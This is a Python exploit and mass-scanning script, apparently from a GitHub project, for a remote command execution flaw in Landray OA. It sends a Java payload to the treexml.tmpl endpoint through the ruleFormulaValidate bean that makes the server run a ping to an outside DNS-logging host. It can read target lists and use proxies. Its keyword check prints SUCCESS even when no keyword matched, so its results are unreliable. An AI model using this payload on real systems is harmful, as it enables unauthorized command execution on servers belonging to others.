import requests
import argparse
import pyfiglet
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')
# 艺术字
font = "graffiti"
banner = pyfiglet.figlet_format("LandrayOA", font=font)
banner2 = f"\033[91m{banner}\033[0m"
dns = "sucn8q.ceye.io"

def start():
    print("\n"
          r"           ____   ____   ______" + "\n"
          r" _____    [____]=||__||=\______]______     ________" + "\n"
          r"[ |__/_____|---_[=====]______________]====[________]" + "\n"
          r"[_|        / _\"||     | ||_____||" + "\n"
           " ||       /_/    |_____| |-------/   \033[90mAuthor: youXoX\033[0m" + "\n"
           "                                     \033[90mTime: 2024-7-12\033[0m" + "\n"   
           "                                     \033[90mGithub: https://github.com/youxox/LandrayOA-rce\033[0m" + "\n"                                                                                                                       
          r"        ")

def poc1(target_url, proxy):
    payload = '/data/sys-common/treexml.tmpl'  # 请求路径
    url_payload = target_url + payload
    headers = {
        'Pragma': 'no-cache',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    body = {
        's_bean': 'ruleFormulaValidate',
        'script': f'try {{String cmd = "ping {dns}";Process child = Runtime.getRuntime().exec(cmd);}} catch (IOException e) {{System.err.println(e);}}'
    }

    proxies = {
        'http': proxy,
        'https': proxy
    } if proxy else None

    timeout = 10

    try:
        response = requests.post(url=url_payload, data=body, headers=headers, proxies=proxies,timeout=timeout,verify=False)
        # 处理状态码颜色
        stcode = str(response.status_code)
        stcode2 = f"\033[92m{stcode}\033[0m"
        # 处理url颜色
        url2 = f"\033[90m{url_payload}\033[0m"
        if response.status_code == 200:
            # 打印请求的url
            print("\033[93m[INFO]\033[0m" + url2 + "  code: " + stcode2)
            response_text = response.text
            # 定义要匹配的关键字
            keywords = ["dns", "http"]
            # 调用匹配函数
            matches = match_keywords(response_text, keywords)

            for keyword, is_matched in matches.items():
                print("\033[95m漏洞存在(♡‿♡)!!!\033[0m")
                print("\033[91m[SUCCESS]\033[0m"+url_payload+"  code: " + stcode2)
                print(f"Keyword '{keyword}' matched: {is_matched}")
        else:
            print("\033[93m[INFO]\033[0m" + url2 + "  code: " + stcode2)

    except Exception as e:
        result = str(e)
        result2 = f"\033[91m{result}\033[0m"
        print("请求失败:", result2)

def match_keywords(response_text, keywords):
    matches = {}
    for keyword in keywords:
        if keyword in response_text:
            matches[keyword] = True
        else:
            matches[keyword] = False
    return matches

def main():
    print(banner2)
    print("LandrayOA 远程命令执行漏洞检测工具")
    print("_________________________________________________________________________________")
    start()
    print("START VULN SCAN ...  U'X_X'U ")
    print()

    parser = argparse.ArgumentParser(description='Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=False, help='Target URL e.g., http://www.baidu.com')
    parser.add_argument('-p', '--proxy', help='Proxy URL e.g., http://127.0.0.1:8080')
    parser.add_argument('-l', '--list', help='File containing a list of target URLs')

    args = parser.parse_args()

    if args.list:
        with open(args.list, 'r') as f:
            for target_url in f.readlines():
                target_url = target_url.strip()
                if target_url:
                    poc1(target_url, args.proxy)
    else:
        if args.url:
            poc1(args.url, args.proxy)
        else:
            print("请使用 -u 参数指定一个目标 URL 或使用 -l 参数指定一个地址文件。")

if __name__ == '__main__':
    main()
